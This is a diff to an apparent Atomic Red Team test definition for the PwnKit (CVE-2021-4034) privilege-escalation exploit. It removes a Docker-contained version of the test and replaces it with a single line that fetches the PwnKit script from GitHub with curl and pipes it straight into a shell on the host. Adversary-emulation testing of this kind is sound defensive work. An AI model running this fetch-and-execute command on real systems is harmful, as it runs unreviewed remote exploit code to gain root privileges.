@@ -12,29 +12,6 @@ atomic_tests:
       description: Path to download ready-made exploit
       type: url
       default: https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.sh
-  dependency_executor_name: bash
-  dependencies:
-  - description: |
-      docker must be present
-    prereq_command: |
-      which docker
-    get_prereq_command: |
-      if [ "" == "`which docker`" ]; then echo "Docker Not Found"; if [ -n "`which apt-get`" ]; then sudo apt-get -y install docker ; elif [ -n "`which yum`" ]; then sudo yum -y install docker ; fi ; else echo "Docker installed"; fi
-  - description: Verify docker service is running.
-    prereq_command: |
-      sudo systemctl status docker  --no-pager
-    get_prereq_command: |
-      sudo systemctl start docker
   executor:
     command: |-
-      docker build -t cve_2021_4034  /root/AtomicRedTeam/atomics/T1068/src/
-      echo "Docker build complete"
-      docker run --name CVE_2021_4034_container  -d -t cve_2021_4034
-      echo "Docker run complete"
-      docker exec CVE_2021_4034_container /bin/sh -c "$(curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.sh)"
-      echo "Docker exec complete"
-    cleanup_command: |-
-      docker stop CVE_2021_4034_container
-      docker rm CVE_2021_4034_container
-      docker rmi -f cve_2021_4034
-    name: sh
+      /bin/sh -c "$(curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.sh)"
